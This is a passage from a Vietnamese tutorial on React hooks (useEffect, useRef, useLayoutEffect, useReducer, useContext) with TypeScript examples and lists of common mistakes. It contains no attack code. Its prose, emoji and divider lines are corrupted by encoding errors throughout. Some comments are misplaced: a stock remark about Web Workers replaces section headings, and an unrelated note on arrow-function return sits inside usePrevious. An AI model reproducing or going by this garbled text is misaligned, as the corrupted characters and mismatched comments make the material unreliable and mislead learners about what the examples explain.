useEffect(async () => { // ‚ùå Error: useEffect kh√¥ng nh·∫≠n async function
  const data = await fetchData();
}, []);

// ‚úÖ Fix: T·∫°o async function b√™n trong
useEffect(() => {
  const fetchData = async () => {
    const data = await fetch('/api');
  };
  fetchData();
}, []);

 // Ch√∫ gi·∫£i: ‚ùå 4. Race condition (fetch data)
useEffect(() => {
  fetchUser(userId).then(setUser); // ‚ùå N·∫øu userId ƒë·ªïi nhanh, response c≈© c√≥ th·ªÉ v·ªÅ sau
}, [userId]);

// ‚úÖ Fix: Use cleanup ƒë·ªÉ ignore stale responses
useEffect(() => {
  let cancelled = false;
  fetchUser(userId).then(data => {
    if (!cancelled) setUser(data);
  });
  return () => { cancelled = true; };
}, [userId]);
```

---

##### **1.3. useRef - Mutable Reference Hook**

**üéØ M·ª•c ƒë√≠ch:**
1. Access DOM elements tr·ª±c ti·∫øp
2. L∆∞u gi√° tr·ªã mutable kh√¥ng trigger re-render
3. L∆∞u previous value c·ªßa state/props

**üìñ useRef vs useState:**

```typescript
// useState: Trigger re-render khi thay ƒë·ªïi
const [count, setCount] = useState(0);
setCount(1); // Ch√∫ gi·∫£i: ‚Üí Component re-render

// useRef: KH√îNG trigger re-render
const countRef = useRef(0);
countRef.current = 1; // ‚Üí Component KH√îNG re-render

 // Ch√∫ gi·∫£i: Timeline:
 // Ch√∫ gi·∫£i: useState: Change state ‚Üí Schedule re-render ‚Üí Re-render ‚Üí Paint
 // Ch√∫ gi·∫£i: useRef: Change ref.current ‚Üí (Nothing happens, no re-render)
```

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: 1. DOM ACCESS (Primary use case)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function AutoFocusInput() {
  const inputRef = useRef<HTMLInputElement>(null);
  
  useEffect(() => {
 // Ch√∫ gi·∫£i: Access DOM node directly
    inputRef.current?.focus();
  }, []);
  
  return <input ref={inputRef} />;
}

 // Ch√∫ gi·∫£i: Complex DOM manipulation
function VideoPlayer() {
  const videoRef = useRef<HTMLVideoElement>(null);
  
  const play = () => videoRef.current?.play();
  const pause = () => videoRef.current?.pause();
  const seek = (time: number) => {
    if (videoRef.current) {
      videoRef.current.currentTime = time;
    }
  };
  
  return (
    <>
      <video ref={videoRef} src="/video.mp4" />
      <button onClick={play}>Play</button>
      <button onClick={pause}>Pause</button>
      <button onClick={() => seek(10)}>Seek to 10s</button>
    </>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// 2. PERSIST VALUES ACROSS RENDERS (kh√¥ng trigger re-render)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function Timer() {
  const [count, setCount] = useState(0);
  const intervalRef = useRef<number>(null);
  
  const start = () => {
    // L∆∞u interval ID ƒë·ªÉ clear sau n√†y
    intervalRef.current = setInterval(() => {
      setCount(prev => prev + 1);
    }, 1000);
  };
  
  const stop = () => {
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
    }
  };
  
  useEffect(() => {
    return () => stop(); // Ch√∫ gi·∫£i: Cleanup
  }, []);
  
  return (
    <div>
      <p>Count: {count}</p>
      <button onClick={start}>Start</button>
      <button onClick={stop}>Stop</button>
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: 3. TRACK PREVIOUS VALUE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function usePrevious<T>(value: T): T | undefined {
  const ref = useRef<T>();
  
  useEffect(() => {
    ref.current = value; // Ch√∫ gi·∫£i: Update ref AFTER render
  });
  
  return ref.current; // Trong arrow function v·ªõi block `{ }` ph·∫£i d√πng `return` ƒë·ªÉ tr·∫£ gi√° tr·ªã; v·ªõi expression c√≥ th·ªÉ tr·∫£ ng·∫ßm (implicit return).
}

function Counter() {
  const [count, setCount] = useState(0);
  const prevCount = usePrevious(count);
  
  return (
    <div>
      <p>Current: {count}</p>
      <p>Previous: {prevCount}</p>
      <button onClick={() => setCount(count + 1)}>Increment</button>
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function ClickTracker() {
  const [renderCount, setRenderCount] = useState(0);
  const clickCountRef = useRef(0); // Kh√¥ng trigger re-render
  
  const handleClick = () => {
    clickCountRef.current++; // Ch√∫ gi·∫£i: Update ref (no re-render)
    console.log('Clicks:', clickCountRef.current);
    
    // Force re-render ƒë·ªÉ show UI
    setRenderCount(prev => prev + 1);
  };
  
  return (
    <div>
      <p>Renders: {renderCount}</p>
      <p>Clicks: {clickCountRef.current}</p>
      <button onClick={handleClick}>Click</button>
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: 5. CALLBACK REF (Advanced)
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function MeasureElement() {
  const [height, setHeight] = useState(0);
  
  // Callback ref: ƒë∆∞·ª£c g·ªçi khi element mount/unmount
  const measureRef = useCallback((node: HTMLDivElement | null) => {
    if (node !== null) {
      setHeight(node.getBoundingClientRect().height);
    }
  }, []);
  
  return (
    <>
      <div ref={measureRef}>
        <p>Measure me!</p>
      </div>
      <p>Height: {height}px</p>
    </>
  );
}
```

**‚ö†Ô∏è Common Mistakes:**

```typescript
// ‚ùå 1. Expect re-render khi thay ƒë·ªïi ref
const countRef = useRef(0);
countRef.current++;
// ‚ùå Component kh√¥ng re-render ‚Üí UI kh√¥ng update

// ‚úÖ Fix: D√πng useState n·∫øu c·∫ßn re-render
const [count, setCount] = useState(0);

 // Ch√∫ gi·∫£i: ‚ùå 2. Mutate ref.current trong render
function Component() {
  const ref = useRef(0);
  ref.current++; // Ch√∫ gi·∫£i: ‚ùå Side effect trong render!
  return <div>{ref.current}</div>;
}

// ‚úÖ Fix: Update trong useEffect ho·∫∑c event handler
useEffect(() => {
  ref.current++;
}, []);

// ‚ùå 3. Kh√¥ng check null khi access DOM
const inputRef = useRef<HTMLInputElement>(null);
inputRef.current.focus(); // ‚ùå C√≥ th·ªÉ null!

// ‚úÖ Fix: Check null ho·∫∑c d√πng optional chaining
inputRef.current?.focus();
```

---

##### **1.4. useLayoutEffect - Synchronous Effect Hook**

**üéØ M·ª•c ƒë√≠ch:**
Ch·∫°y effect TR∆Ø·ªöC KHI browser paint (synchronous), d√πng cho DOM measurements ho·∫∑c mutations c·∫ßn x·∫£y ra tr∆∞·ªõc khi user th·∫•y UI.

**üìñ useEffect vs useLayoutEffect Timeline:**

```typescript
 // Ch√∫ gi·∫£i: useEffect:
 // Ch√∫ gi·∫£i: 1. React renders component (Virtual DOM)
 // Ch√∫ gi·∫£i: 2. React commits to real DOM
 // Ch√∫ gi·∫£i: 3. Browser PAINTS screen (user th·∫•y UI)
// 4. useEffect runs (AFTER paint - kh√¥ng block UI)

 // Ch√∫ gi·∫£i: useLayoutEffect:
 // Ch√∫ gi·∫£i: 1. React renders component
 // Ch√∫ gi·∫£i: 2. React commits to real DOM
 // Ch√∫ gi·∫£i: 3. useLayoutEffect runs (BEFORE paint - BLOCKS UI)
// 4. Browser paints (user th·∫•y UI ƒë√£ updated)
```

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
// KHI N√ÄO D√ôNG useLayoutEffect?
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

 // Ch√∫ gi·∫£i: ‚úÖ Use case 1: DOM measurements (avoid flicker)
function Tooltip() {
  const [tooltip, setTooltip] = useState({ x: 0, y: 0 });
  const buttonRef = useRef<HTMLButtonElement>(null);
  
  // ‚ùå useEffect: User th·∫•y tooltip nh·∫£y v√¨ ch·∫°y SAU paint
  useEffect(() => {
    const rect = buttonRef.current?.getBoundingClientRect();
    setTooltip({ x: rect.left, y: rect.bottom });
  }, []);
  
  // ‚úÖ useLayoutEffect: Tooltip ƒë√∫ng v·ªã tr√≠ ngay t·ª´ ƒë·∫ßu
  useLayoutEffect(() => {
    const rect = buttonRef.current?.getBoundingClientRect();
    setTooltip({ x: rect.left, y: rect.bottom });
  }, []);
  
  return (
    <>
      <button ref={buttonRef}>Hover me</button>
      <div style={{ position: 'absolute', left: tooltip.x, top: tooltip.y }}>
        Tooltip
      </div>
    </>
  );
}

 // Ch√∫ gi·∫£i: ‚úÖ Use case 2: Scroll position (avoid jump)
function RestoreScroll() {
  const contentRef = useRef<HTMLDivElement>(null);
  
  useLayoutEffect(() => {
 // Ch√∫ gi·∫£i: Restore scroll TR∆Ø·ªöC khi paint ‚Üí no visual jump
    const savedScroll = localStorage.getItem('scrollPos');
    if (savedScroll && contentRef.current) {
      contentRef.current.scrollTop = parseInt(savedScroll);
    }
  }, []);
  
  useEffect(() => {
    const handleScroll = () => {
      if (contentRef.current) {
        localStorage.setItem('scrollPos', contentRef.current.scrollTop.toString());
      }
    };
    
    contentRef.current?.addEventListener('scroll', handleScroll);
    return () => contentRef.current?.removeEventListener('scroll', handleScroll);
  }, []);
  
  return <div ref={contentRef} style={{ height: 400, overflow: 'auto' }}>
    {/* Long content */}
  </div>;
}

 // Ch√∫ gi·∫£i: ‚úÖ Use case 3: Animate before paint
function AnimatedBox() {
  const boxRef = useRef<HTMLDivElement>(null);
  
  useLayoutEffect(() => {
 // Ch√∫ gi·∫£i: Set initial position BEFORE paint
    if (boxRef.current) {
      boxRef.current.style.transform = 'translateX(-100px)';
      boxRef.current.style.opacity = '0';
    }
    
 // Ch√∫ gi·∫£i: Then animate (browser batches with paint)
    requestAnimationFrame(() => {
      if (boxRef.current) {
        boxRef.current.style.transition = 'all 0.3s';
        boxRef.current.style.transform = 'translateX(0)';
        boxRef.current.style.opacity = '1';
      }
    });
  }, []);
  
  return <div ref={boxRef}>Animated Box</div>;
}
```

**‚ö†Ô∏è Khi n√†o KH√îNG n√™n d√πng useLayoutEffect:**

```typescript
// ‚ùå Data fetching (kh√¥ng c·∫ßn sync)
useLayoutEffect(() => {
  fetch('/api').then(setData); // Ch√∫ gi·∫£i: Block UI unnecessarily!
}, []);

// ‚úÖ D√πng useEffect thay v√¨
useEffect(() => {
  fetch('/api').then(setData);
}, []);

// ‚ùå Subscriptions (kh√¥ng c·∫ßn sync)
useLayoutEffect(() => {
  const sub = eventEmitter.on('event', handler);
  return () => sub.off();
}, []);

// ‚úÖ D√πng useEffect
useEffect(() => {
  const sub = eventEmitter.on('event', handler);
  return () => sub.off();
}, []);

 // Ch√∫ gi·∫£i: Rule of thumb:
 // Ch√∫ gi·∫£i: - useEffect: 99% cases (default choice)
// - useLayoutEffect: Ch·ªâ khi c√≥ visual bugs (flicker, jump, wrong position)
```

---

##### **1.5. useReducer - Complex State Management Hook**

**üéØ M·ª•c ƒë√≠ch:**
Qu·∫£n l√Ω state ph·ª©c t·∫°p v·ªõi logic x·ª≠ l√Ω t·∫≠p trung (gi·ªëng Redux pattern).

**üìñ Khi n√†o d√πng useReducer thay v√¨ useState:**
- State c√≥ nhi·ªÅu sub-values li√™n quan
- State update logic ph·ª©c t·∫°p (nhi·ªÅu actions)
- Next state ph·ª• thu·ªôc v√†o previous state
- Mu·ªën centralize state logic (d·ªÖ test)

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: BASIC PATTERN
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

type State = { count: number };
type Action = 
  | { type: 'increment' }
  | { type: 'decrement' }
  | { type: 'reset' }
  | { type: 'set'; payload: number };

function reducer(state: State, action: Action): State {
  switch (action.type) {
    case 'increment':
      return { count: state.count + 1 };
    case 'decrement':
      return { count: state.count - 1 };
    case 'reset':
      return { count: 0 };
    case 'set':
      return { count: action.payload };
    default:
      return state;
  }
}

function Counter() {
  const [state, dispatch] = useReducer(reducer, { count: 0 });
  
  return (
    <div>
      <p>Count: {state.count}</p>
      <button onClick={() => dispatch({ type: 'increment' })}>+</button>
      <button onClick={() => dispatch({ type: 'decrement' })}>-</button>
      <button onClick={() => dispatch({ type: 'reset' })}>Reset</button>
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: REAL-WORLD: TODO APP
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

type Todo = { id: number; text: string; done: boolean };
type TodoState = { todos: Todo[]; filter: 'all' | 'active' | 'completed' };
type TodoAction =
  | { type: 'ADD_TODO'; text: string }
  | { type: 'TOGGLE_TODO'; id: number }
  | { type: 'DELETE_TODO'; id: number }
  | { type: 'SET_FILTER'; filter: 'all' | 'active' | 'completed' }
  | { type: 'CLEAR_COMPLETED' };

function todoReducer(state: TodoState, action: TodoAction): TodoState {
  switch (action.type) {
    case 'ADD_TODO':
      return {
        ...state,
        todos: [...state.todos, { 
          id: Date.now(), 
          text: action.text, 
          done: false 
        }]
      };
      
    case 'TOGGLE_TODO':
      return {
        ...state,
        todos: state.todos.map(todo =>
          todo.id === action.id ? { ...todo, done: !todo.done } : todo
        )
      };
      
    case 'DELETE_TODO':
      return {
        ...state,
        todos: state.todos.filter(todo => todo.id !== action.id)
      };
      
    case 'SET_FILTER':
      return { ...state, filter: action.filter };
      
    case 'CLEAR_COMPLETED':
      return {
        ...state,
        todos: state.todos.filter(todo => !todo.done)
      };
      
    default:
      return state;
  }
}

function TodoApp() {
  const [state, dispatch] = useReducer(todoReducer, {
    todos: [],
    filter: 'all'
  });
  
  const visibleTodos = state.todos.filter(todo => {
    if (state.filter === 'active') return !todo.done;
    if (state.filter === 'completed') return todo.done;
    return true;
  });
  
  return (
    <div>
      <input 
        type="text"
        onKeyPress={(e) => {
          if (e.key === 'Enter') {
            dispatch({ type: 'ADD_TODO', text: e.currentTarget.value });
            e.currentTarget.value = '';
          }
        }}
      />
      
      <ul>
        {visibleTodos.map(todo => (
          <li key={todo.id}>
            <input
              type="checkbox"
              checked={todo.done}
              onChange={() => dispatch({ type: 'TOGGLE_TODO', id: todo.id })}
            />
            {todo.text}
            <button onClick={() => dispatch({ type: 'DELETE_TODO', id: todo.id })}>
              Delete
            </button>
          </li>
        ))}
      </ul>
      
      <div>
        <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'all' })}>
          All
        </button>
        <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'active' })}>
          Active
        </button>
        <button onClick={() => dispatch({ type: 'SET_FILTER', filter: 'completed' })}>
          Completed
        </button>
        <button onClick={() => dispatch({ type: 'CLEAR_COMPLETED' })}>
          Clear Completed
        </button>
      </div>
    </div>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: LAZY INITIALIZATION
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

function init(initialCount: number): State {
 // Ch√∫ gi·∫£i: Expensive computation
  return { count: initialCount * 2 };
}

function Counter() {
 // Ch√∫ gi·∫£i: Init function ch·ªâ ch·∫°y 1 l·∫ßn
  const [state, dispatch] = useReducer(reducer, 10, init);
 // Ch√∫ gi·∫£i: state.count = 20 (10 * 2)
}
```

**‚ö†Ô∏è useReducer vs useState:**

```typescript
 // Ch√∫ gi·∫£i: useState: Simple state
const [count, setCount] = useState(0);
const [name, setName] = useState('');
const [email, setEmail] = useState('');

 // Ch√∫ gi·∫£i: useReducer: Complex related state
type FormState = { name: string; email: string; errors: string[] };
const [state, dispatch] = useReducer(formReducer, initialState);

 // Ch√∫ gi·∫£i: Rule:
 // Ch√∫ gi·∫£i: - 1-3 related values ‚Üí useState
 // Ch√∫ gi·∫£i: - 4+ related values OR complex logic ‚Üí useReducer
```

---

##### **1.6. useContext - Consume Context Values**

**üéØ M·ª•c ƒë√≠ch:** Share data across component tree m√† kh√¥ng c·∫ßn pass props (theme, auth, language).

**üìñ C√°ch ho·∫°t ƒë·ªông:**

```typescript
 // Ch√∫ gi·∫£i: Context flow:
 // Ch√∫ gi·∫£i: 1. createContext() ‚Üí T·∫°o Context object
 // Ch√∫ gi·∫£i: 2. <Provider value={...}> ‚Üí Cung c·∫•p value
// 3. useContext(Context) ‚Üí Subscribe v√† nh·∫≠n value
// 4. Khi value thay ƒë·ªïi ‚Üí All consumers re-render

 // Hi·ªáu su·∫•t: tr√°nh ch·∫∑n main thread; d√πng Web Worker, chia nh·ªè t√°c v·ª•, t·ªëi ∆∞u reflow/repaint.
// - Context re-render T·∫§T C·∫¢ consumers khi value thay ƒë·ªïi
// - Kh√¥ng c√≥ selector mechanism (kh√°c Redux)
// - C·∫ßn optimize b·∫±ng React.memo ho·∫∑c useMemo
```

**üí° Chi ti·∫øt k·ªπ thu·∫≠t:**

```typescript
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: BASIC USAGE
 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê

type Theme = 'light' | 'dark';
const ThemeContext = createContext<Theme>('light');

function App() {
  const [theme, setTheme] = useState<Theme>('light');
  
  return (
    <ThemeContext.Provider value={theme}>
      <Toolbar />
      <button onClick={() => setTheme(theme === 'light' ? 'dark' : 'light')}>
        Toggle Theme
      </button>
    </ThemeContext.Provider>
  );
}

function Toolbar() {
  return <ThemedButton />;
}

function ThemedButton() {
  const theme = useContext(ThemeContext); // Ch√∫ gi·∫£i: ‚úÖ Clean syntax
  
  return (
    <button className={theme}>
      I am styled with {theme} theme
    </button>
  );
}

 // Ch√∫ gi·∫£i: Old way (before hooks):
function ThemedButtonOld() {
  return (
    <ThemeContext.Consumer>
      {theme => ( // Ch√∫ gi·∫£i: ‚ùå Wrapper hell
        <button className={theme}>
          I am styled with {theme} theme
        </button>
      )}
    </ThemeContext.Consumer>
  );
}

 // Ch√∫ gi·∫£i: ‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê
 // Ch√∫ gi·∫£i: MULTIPLE CONTEXTS
